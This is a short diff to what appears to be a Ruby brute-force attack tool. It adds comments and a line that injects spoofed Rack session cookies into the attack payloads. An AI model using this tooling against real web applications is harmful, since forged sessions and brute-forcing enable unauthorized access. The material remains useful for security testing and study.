@@ -11,16 +11,23 @@ def payload_factory(params)
 end
 
 def setup_attack
+  #Read command line arguments
   target = ARGV.shift
   fixed_params = parse(ARGV.shift)
 
+  #Create empty attack
   attack = BruteForceAttack.new(target)
   attack.set_fixed_req_params(fixed_params) if fixed_params.any?
 
+  #Create user defined payloads
   payloads = ARGV.map do |params|
     payload_factory(params)
   end
+
+  #Add spoofed rack session
+  payloads << PayloadSet.new('rack.session').add_values_from_function(:generate_cookie, payloads.first.size)
   
+  #Load payloads into attack
   attack.add_payloads(payloads)
 end
 
